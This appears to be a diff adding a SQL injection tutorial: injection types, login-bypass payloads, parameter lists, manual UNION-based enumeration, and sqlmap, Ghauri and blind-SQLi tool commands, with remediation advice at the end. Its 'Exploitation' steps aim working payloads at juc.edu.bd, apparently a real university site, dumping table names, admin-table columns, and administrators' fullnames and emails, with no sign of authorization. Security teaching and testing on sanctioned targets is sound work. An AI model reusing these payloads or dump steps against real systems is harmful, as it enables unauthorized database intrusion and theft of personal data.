@@ -1,0 +1,365 @@
+                                                                                     What is SQL Injection?
+
+SQL Injection is a web application vulnerability where an attacker injects malicious SQL queries into user input fields.
+If the application does not properly validate or sanitize input, the attacker can read database data, bypass authentication.
+
+
+                                                                                   
+                                                                                      Types of SQL Injection
+
+
+1.In-Band SQL Injection
+Attacker uses the same channel to inject payloads and receive results.
+
+Error-Based SQL Injection :
+Uses database error messages to extract information.
+Example: Forcing SQL errors to reveal table names or columns.
+
+Union-Based SQL Injection :
+Uses the UNION SELECT statement to fetch data from other tables.
+Example: Extracting usernames and passwords.
+
+
+2. Blind SQL Injection
+No error messages or visible output, but behavior changes reveal information.
+
+Boolean-Based Blind SQLi:
+Uses true/false conditions to infer data.
+Example: AND 1=1 (true) vs AND 1=2 (false)
+
+Time-Based Blind SQLi:
+Uses time delays to confirm conditions.
+Example: SLEEP(5) if a condition is true.
+
+
+3. Authentication Bypass SQL Injection
+Used specifically to bypass login mechanisms.
+Allows login without valid credentials.
+
+Example payload: 
+' OR 1=1--,
+" OR 1=1 #
+') OR 1=1 #
+") OR 1=1 #
+
+NOTE: These payloads are injected into username or password fields to bypass authentication by manipulating SQL logic.
+
+
+
+
+Parameters to Test : id=, pid=, uid=, cid=, rid=, mid=, fid=, tid=, sid=, item=, order=, invoice=, productid=, categoryid=, articleid=, pageid=, userid=, postid=, threadid=, commentid=, newsid=, eventid=, voteid=, pollid=, memberid=, entryid=, listingid=, sessionid=, recordid=, fileid=, docid=, reportid=, customerid=, page=, cat=, type=, sort=, filter=, status=, lang=, year=, date=, search=, keyword=, query=, lookup=, find=, token=, apikey=, user=, email=, username=, password=, session=, auth=, jwt=, key=, access_token=, login=, logout=, redirect=, callback=, cmd=, debug=, exec=, load=, process=, step=, action=, module=, view=, template=, config=, admin=, path=, dir=, folder=, file=
+
+
+
+                                                                                               
+                                                                                          
+                                                                                       Steps to Reproduce :
+
+
+1. Testing
+
+https://anyurl.com/page.php?id=1'
+
+If an SQL error occurs, the parameter may be vulnerable.
+
+
+2. Determine the number of columns
+Use the ORDER BY clause to identify the total number of columns.
+
+id=1' ORDER BY 4--+
+
+Increase the number until an error appears.
+The last valid number indicates the column count.
+
+
+3. vulnerable columns
+Use a UNION query to find columns that accept output.
+
+id=-1' UNION ALL SELECT 1,2,3--+
+
+Columns displayed in the response are injectable.
+
+
+4.Extract database name and server version
+
+id=-1' UNION ALL SELECT 1,database(),version()--+
+
+This reveals the current database name and database server version
+
+
+
+
+                                                                      Setup Cyberfox + HackBar for Manual SQL Injection Testing
+
+Step 5: Download Cyberfox Browser
+
+Cyberfox is a privacy-focused browser suitable for isolated security testing environments.
+
+Download: https://sourceforge.net/projects/cyberfox/
+
+
+Step 6: Download HackBar (.xpi) Extension
+
+HackBar is a browser extension used for manual SQL Injection, XSS, LFI, and other web vulnerability testing.
+
+Download: https://github.com/emyounoone/Hackbar
+
+
+Step 7: Install HackBar (.xpi) in Cyberfox
+
+Since Cyberfox does not support automatic add-on installation, HackBar must be installed manually.
+
+Installation Guide (Video): https://drive.google.com/file/d/13kJWkfBzZ6AQy-1SzUQ4yXSvOenDkKy4/view?usp=drivesdk
+
+
+                                                                                         
+                                                                                             Exploitation
+
+
+
+Step 8: Extract All Table Names from a Specific Database
+After identifying the number of columns and injectable columns, extract all table names from a target database using INFORMATION_SCHEMA.
+
+Payload:https://www.juc.edu.bd/page.php?id=-5' UNION ALL SELECT 
+1,2,3,
+(SELECT GROUP_CONCAT(table_name SEPARATOR 0x3c62723e)
+FROM INFORMATION_SCHEMA.TABLES
+WHERE TABLE_SCHEMA=0x6578706c6f726565696d735f6a75636564755f6473616466),
+5,6,7,8,9,10,11,12,13--+
+
+NOTE: This payload was generated using the HackBar extension in the Cyberfox browser by utilizing the table enumeration feature and injecting it into a vulnerable column
+
+
+
+
+Step 9: Extract All Column Names from a Specific Table
+After identifying the database and table names, extract all column names from a target table using INFORMATION_SCHEMA.
+
+Payload:https://www.juc.edu.bd/page.php?id=-5' UNION ALL SELECT 
+1,2,3,
+(SELECT GROUP_CONCAT(column_name SEPARATOR 0x3c62723e)
+FROM INFORMATION_SCHEMA.COLUMNS
+WHERE TABLE_NAME=0x61646d696e),
+5,6,7,8,9,10,11,12,13--+
+
+Note:This payload was generated using the Cyberfox browser with the HackBar extension, leveraging the Column Enumeration feature and injected into a vulnerable column.
+
+
+
+Step 10: Dump Data from a Specific Database, Table, and Columns
+After identifying the database, table, and column names, extract sensitive data using a UNION-based SQL Injection payload.
+
+Payload:https://www.juc.edu.bd/page.php?id=-5' UNION ALL SELECT 
+1,2,3,
+(SELECT GROUP_CONCAT(fullname,email SEPARATOR 0x3c62723e)
+FROM exploreeims_jucedu_dsadf.tbl_admin),
+5,6,7,8,9,10,11,12,13--+
+
+Note:This payload was generated using the Cyberfox browser with the HackBar extension, utilizing the Data Enumeration feature and injected into a vulnerable column.
+
+
+
+                                                                          
+
+                                                                           POST-Based SQL Injection Exploitation (Login Form)
+This technique targets POST parameters (e.g., username/password) instead of URL parameters.
+
+
+Step 1: Identify SQL Injection
+Test the input field (e.g., username) with a quote to check for SQL errors.
+
+' ORDER BY 1--
+
+Step 2: Find the Number of Columns
+Increment the column number until an error occurs.
+
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+
+The last successful value indicates the total number of columns.
+
+Step 3: Identify Injectable Columns
+Use a UNION query matching the column count.
+
+' UNION ALL SELECT 1,2,3,4,5,6,7--
+
+Columns reflected in the response are injectable.
+
+
+Step 4: Extract Database Information
+Retrieve database name and server version.
+
+' UNION ALL SELECT version(), database(), 3,4,5,6,7--
+
+Note : This exploitation was performed on a POST-based login form.
+      The same process was carried out using the Cyberfox browser with the HackBar extension.{Same process in flowchart as paramter Testing}
+
+
+
+
+                                                                           
+                                                                       Automatic Tools Use for SQL Injection
+
+TOOl 1 SQLMAP :
+
+Step 1: Check if the Parameter Is Vulnerable
+sqlmap -u "http://testphp.vulnweb.com/id=1" --risk=3 --level=5 --batch --random-agent
+
+
+Step 2: Extract Database Names
+Enumerate all available databases on the server.
+
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs
+
+
+Step 3: Extract Table Names from a Specific Database
+List all tables inside a chosen database.
+
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D database_name --tables
+
+Note:Replace database_name with a database identified in Step 2.
+
+
+Step 4: Extract Column Names from a Specific Table
+List all columns in a selected table.
+
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D database_name -T table_name --columns
+
+Note:Replace table_name with a table identified in Step 3.
+
+
+
+Step 5: Dump Data from Specific Columns
+Extract actual data from selected columns.
+
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D database_name -T table_name -C column1,column2 --dump
+
+Example columns: username,password, email,fullname
+
+
+
+Tool 2 Ghauri:
+
+Installation :
+git clone https://github.com/r0oth3x49/ghauri.git
+cd ghauri
+sudo python3 setup.py install
+
+Step 1: Extract Database Names
+ghauri -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs
+
+Result: Tests the parameter for SQL Injection
+        Displays all available database names
+
+
+Step 2: Extract Table Names from a Database
+ghauri -u "http://testphp.vulnweb.com/artists.php?artist=1" -D dbname --tables
+
+Note:Replace dbname with a database name found in Step 1
+
+
+Step 3: Extract Column Names from a Table
+ghauri -u "http://testphp.vulnweb.com/artists.php?artist=1" -D dbname -T tablename --columns
+
+Note: Replace tablename with a table name from Step 2
+
+
+
+Step 4: Dump Data from Specific Columns
+ghauri -u "http://testphp.vulnweb.com/artists.php?artist=1" -D dbname -T tablename -C column1,column2 --dump
+
+Note: Replace column1,column2 with real column names (e.g., username,password)
+
+
+
+
+                                                           
+                                                                                      Tool for Blind SQL Injection Testing
+
+
+Download & Setup:
+git clone https://github.com/jahithoque/BSQLi-from-Lostsec.git
+cd BSQLi-from-Lostsec
+chmod +x lostsec.py
+
+Download Payload File:wget https://raw.githubusercontent.com/jahithoque/BSQLi-from-Lostsec/master/payloads/xor.txt -O xor.txt
+
+Usage:python3 lostsec.py -u "http://testphp.vulnweb.com/artists.php?artist=1" -p payloads/xor.txt
+
+
+
+                                                                               
+                                                                                    CVSS Scores for SQL Injection
+
+Auth bypass SQLi: CVSS 9.8 – P1
+get,post-based SQLi: CVSS 8.2 – P2
+Blind SQLi: CVSS 6.5 – P3
+
+
+
+
+                                                                                        Impact of SQL Injection
+1.Authentication Bypass
+Attackers can log in without valid credentials.
+
+2.Sensitive Data Exposure
+Theft of usernames, passwords, emails, PII, financial data.
+
+3.Privilege Escalation
+Normal users can gain admin-level access.
+
+4.Complete Database Compromise
+Full control over the database contents.
+
+5.Business & Legal Impact
+Data breaches, reputation damage, compliance violations, financial loss.
+
+
+
+
+                                                                              Remediation / Mitigation for SQL Injection
+1. Use Parameterized Queries (Prepared Statements)
+Separate SQL logic from user input.
+Most effective and recommended fix.
+Example (Concept): SELECT * FROM users WHERE username = ? AND password = ?
+
+2. Input Validation & Sanitization
+Validate input length, type, and format.
+Reject unexpected characters.
+Never trust user-controlled input.
+
+3. Least Privilege Principle
+Database users should have only required permissions.
+Avoid using root or admin DB accounts.
+
+4.Proper Error Handling
+Do not display database error messages to users.
+Use generic error messages.
+
+5. Web Application Firewall (WAF)
+Helps detect and block common SQLi payloads.
+
+6. Regular Security Testing
+Perform manual testing and automated scans.
+Use tools like sqlmap, Burp Suite, OWASP ZAP on authorized targets.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
